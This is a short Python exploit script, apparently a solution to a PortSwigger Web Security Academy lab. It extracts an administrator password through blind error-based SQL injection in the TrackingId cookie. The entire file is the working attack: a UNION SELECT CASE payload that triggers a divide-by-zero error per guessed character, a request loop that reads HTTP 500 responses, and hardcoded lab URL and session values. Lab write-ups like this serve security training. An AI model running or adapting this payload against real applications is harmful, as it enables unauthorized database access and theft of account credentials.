import requests
import string

# Author : 0x2nac0nda

def guess_password(url, character_set, session_cookie):
    """
    Guess the password character by character using SQL injection.
    
    :param url: Target URL for the SQL injection.
    :param character_set: Set of characters to test for each password character.
    :param session_cookie: Session cookie value for authentication.
    :return: Guessed password.
    """
    password = ""
    session = requests.Session()
    
    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0",
        "Referer": url,
        "Connection": "close",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate"
    }

    params = {"category": "Pets"}

    for i in range(1, 21):
        for c in character_set:
            cookies = {
                "TrackingId": f"' UNION SELECT CASE WHEN (username='administrator' AND substr(password,{i},1)='{c}') THEN to_char(1/0) ELSE NULL END FROM users -- -",
                "session": session_cookie
            }

            try:
                response = session.get(url, params=params, headers=headers, cookies=cookies)
                if response.status_code == 500:
                    password += c
                    print(password)
                    break
            except requests.RequestException as e:
                print(f"An error occurred: {e}")

    return password

# URL and session cookie
target_url = "https://0ae200af0495f13f8004f80a006e00cb.web-security-academy.net/"
session_cookie_value = "4GkDHEMeYodkyycImIjKBfiT65nmjCAM"

# Character set including lowercase, uppercase letters, and digits
character_set = string.ascii_lowercase + string.ascii_uppercase + string.digits

# Guess the password
guessed_password = guess_password(target_url, character_set, session_cookie_value)
print(f"[+] Found administrator password: {guessed_password}")
